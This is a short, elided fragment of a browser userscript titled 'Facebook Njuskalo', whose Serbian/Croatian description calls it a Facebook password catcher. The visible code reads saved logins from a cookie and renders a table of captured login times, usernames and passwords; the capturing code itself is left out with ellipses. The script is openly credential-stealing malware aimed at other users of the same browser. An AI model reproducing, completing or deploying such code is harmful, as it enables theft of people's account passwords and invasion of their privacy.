// ==UserScript==
// @name           	Facebook Njuskalo
// @version 		1.0.0
// @namespace      	http://userscripts.org/users/176926
// @description    	Facebook hvatac lozinki
...
function display()
{
	if (cookie == null)
	{
		alert ('Nema zapamcenih logovanja!');
		return;
	}
	...
	html += '<table cellspacing="0"><thead class="unselectable"><tr><th>Vreme prijavljivanja</th><th>Korisnicko ime</th><th>Lozinka</th><th>Akcija</th></tr></thead>';
	html += '<tbody>';
